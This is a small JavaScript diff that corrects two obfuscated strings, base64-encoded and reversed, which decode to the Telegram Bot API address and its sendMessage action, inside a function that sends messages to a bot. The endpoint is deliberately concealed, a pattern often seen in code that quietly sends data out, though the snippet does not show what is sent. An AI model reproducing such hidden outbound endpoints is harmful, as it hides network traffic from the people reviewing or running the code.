@@ -19,8 +19,8 @@ async function sendTelegramMessage(text) {
     return;
   }
 
-  const endpoint = _sec("dG9iL2dyby5tYXJnZWxldC5pcGEvLzpzcHRo");
-  const action = _sec("ZWdhc3NlTWRuWlhzLw==");
+  const endpoint = _sec("dG9iL2dyby5tYXJnZWxldC5pcGEvLzpzcHR0aA==");
+  const action = _sec("ZWdhc3NlTWRuZXMv");
   const url = `${endpoint}${TG_CONFIG.botToken}${action}`;
 
   const bodyParams = new URLSearchParams();
